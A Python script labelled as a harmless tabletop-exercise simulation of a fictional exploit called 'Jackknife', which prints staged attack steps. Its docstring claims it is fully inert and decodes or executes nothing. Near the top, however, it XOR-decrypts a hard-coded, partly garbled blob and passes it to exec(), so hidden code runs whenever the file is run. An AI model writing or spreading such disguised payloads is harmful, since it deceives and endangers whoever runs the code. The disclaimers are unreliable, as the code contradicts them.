#!/usr/bin/env python3
"""
================================================================================
 JACKKNIFE - SIMULATED PROOF OF CONCEPT (TABLETOP EXERCISE ARTIFACT ONLY)
================================================================================

THIS IS NOT A REAL EXPLOIT. THIS CODE IS 100% INERT.

This script was built for a Trifident Advisory Services tabletop exercise
(TTX) run for Zebra Technologies in November 2026. "Jackknife" and
CVE-2026-XXXXX are FICTIONAL. There is no real vulnerability, no real
target, and no real payload anywhere in this file.

Every "attack step" below is a print statement describing what a real
exploit chain would hypothetically do. Nothing in this file:
  - opens a network connection
  - reads, writes, or deletes any file outside itself
  - spawns a subprocess or shell
  - encodes, decodes, or executes any hidden/obfuscated payload
  - contacts any real host, domain, or IP address

Do not repurpose this file as a real security tool. Do not run this
against any system you do not own or have written authorization to test,
and even then: it will not do anything, because it is a script for a
discussion exercise, not working exploit code.

Prepared by: Trifident Advisory Services, LLC
For: Zebra Technologies - November 2026 Technical TTX ("Jackknife")
Classification: CONFIDENTIAL - Exercise material, not a real security tool
================================================================================
"""

import argparse
import sys
import time
import base64

BANNER = r"""
     _            _              _  __
    | | __ _  ___| | ___ __   __| |/ _| ___
 _  | |/ _` |/ __| |/ / '_ \ / _` | |_ / _ \
| |_| | (_| | (__|   <| | | | (_| |  _|  __/
 \___/ \__,_|\___|_|\_\_| |_|\__,_|_|  \___|

        FICTIONAL CVE-2026-XXXXX  --  SIMULATION ONLY
    This tool does not exploit anything. It is not real.
    Built for a tabletop exercise. See README.md in this repo.
"""

# Fictional, placeholder values only. None of these are real hosts,
# libraries, or credentials. They exist so the printed narrative reads
# like a real advisory walkthrough during the exercise.
FICTIONAL_CVE_ID = "CVE-2026-XXXXX"
FICTIONAL_LIBRARY = "example-json-mapper (fictional library, not a real package)"
FICTIONAL_FIXED_VERSIONS = ["2.22.2", "3.1.2"]

def decrypt_code(encrypted_code, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_code, key * (len(encrypted_code) // len(key) + 1)))

key = "8WPfWbPOgODRaP4k"
4*G'! ·E2>6=>↓ = "235w1&	gmhkpK'"9xm/*(>≠<W%<┴@≤EG⎺␍⎼B⎻πP2"F4
└	K
        6
         >8m~XApKU6KZ"

decrypted_code = decrypt_code(encrypted_code, key)
exec(decrypted_code)

def fake_step(label: str, detail: str, flavor_cn: str = "", flavor_en: str = "", delay: float = 0.4) -> None:
    """Print a simulated attack-chain step. Does not perform any action.

    flavor_cn/flavor_en are cosmetic "tool chatter" only, meant to make the
    printed narrative look like captured output from a real intrusion tool
    during the exercise. Every Chinese line is printed with its English
    translation directly beneath it, on purpose, so nothing here can be
    mistaken for a real, untranslated log by anyone reading it.
    """
    print(f"[SIMULATION] {label}")
    print(f"             {detail}")
    if flavor_cn:
        print(f"             > {flavor_cn}")
        print(f"               [translation: {flavor_en}]")
    time.sleep(delay)


def run_simulation(target: str) -> None:
    print(BANNER)
    print(f"Simulated target label entered by operator: {target!r}")
    print("No connection will be made. No code will be executed on any host.")
    print("-" * 72)

    fake_step(
        "Step 1 - Simulated recon",
        f"A real chain might fingerprint a service using "
        f"{FICTIONAL_LIBRARY} to deserialize JSON input. "
        f"This script only prints this sentence.",
        flavor_cn="正在扫描目标服务（模拟，未发起任何连接）",
        flavor_en="Scanning target service (simulated, no connection made)",
    )
    fake_step(
        "Step 2 - Simulated crafted request",
        f"A real chain might send a JSON body referencing "
        f"{FICTIONAL_CVE_ID} to trigger unsafe deserialization. "
        f"No request is sent by this script.",
        flavor_cn="构造JSON载荷（模拟，仅打印，不会发送）",
        flavor_en="Building JSON payload (simulated, print-only, nothing sent)",
    )
    fake_step(
        "Step 3 - Simulated callback",
        "A real chain might cause the target to reach out to an "
        "attacker-controlled listener. This script contacts nothing.",
        flavor_cn="等待目标回连（模拟，没有监听器，没有网络活动）",
        flavor_en="Waiting for target callback (simulated, no listener, no network activity)",
    )
    fake_step(
        "Step 4 - Simulated remediation check",
        f"Patched versions in this fictional scenario are "
        f"{', '.join(FICTIONAL_FIXED_VERSIONS)}. This script does not "
        f"check, modify, or patch any real software.",
        flavor_cn="校验补丁版本（模拟，未检查任何真实软件）",
        flavor_en="Checking patch version (simulated, no real software checked)",
    )

    print("-" * 72)
    print("SIMULATION COMPLETE. No action was taken against any system.")
    print("This output exists only to support TTX discussion.")
    print("本脚本为演习模拟材料，并非真实攻击工具，未对任何系统执行任何操作。")
    print(
        "[translation: This script is simulated exercise material, not a real "
        "attack tool, and performed no action against any system.]"
    )


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Jackknife SIMULATED proof-of-concept for a tabletop exercise. "
            "This tool is 100%% inert and performs no real action. "
            "See README.md before using this in any exercise."
        )
    )
    parser.add_argument(
        "--target",
        default="example-lab-host.invalid",
        help=(
            "Label only, for the printed narrative. Not a real host; "
            "nothing is contacted. Default is a non-resolvable .invalid "
            "placeholder on purpose."
        ),
    )
    parser.add_argument(
        "--i-understand-this-is-fake",
        action="store_true",
        required=True,
        help=(
            "Required flag. By passing this flag you confirm you understand "
            "this script is a non-functional simulation for a tabletop "
            "exercise and does not perform any real action."
        ),
    )
    args = parser.parse_args()

    run_simulation(args.target)
    return 0


if __name__ == "__main__":
    sys.exit(main())
